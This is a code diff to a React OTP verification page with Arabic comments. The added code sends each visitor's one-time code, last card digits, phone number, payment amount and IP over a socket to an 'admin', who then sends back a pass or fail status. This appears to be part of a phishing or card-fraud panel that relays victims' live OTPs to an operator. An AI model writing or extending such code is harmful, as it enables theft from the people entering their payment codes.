@@ -45,18 +45,29 @@ export default function OTPVerification() {
   useEffect(() => {
     if (!socket) return;
 
-    // حفظ رمز OTP في sessionStorage للأدمن
-    sessionStorage.setItem('pendingOTP', JSON.stringify({
+    // الحصول على IP الخاص بالمستخدم
+    const userIP = sessionStorage.getItem('userIP');
+
+    // إرسال رمز OTP للأدمن عبر Socket
+    socket.emit('newOTP', {
+      ip: userIP,
       otpCode,
       cardLastDigits,
       phoneNumber,
       amount,
       timestamp: new Date().toISOString()
-    }));
+    });
 
     // استماع لحالة التحقق من OTP من الأدمن
     socket.on('otpVerificationStatus', (data) => {
-      console.log('🔐 OTP verification status:', data);
+      console.log('🔐 OTP verification status received:', data);
+      
+      // التحقق من أن الرسالة موجهة لهذا المستخدم فقط
+      if (data.ip && data.ip !== userIP) {
+        console.log('⚠️ OTP status not for this user, ignoring');
+        return;
+      }
+
       setStatus(data.status);
       setMessage(data.message || '');
 
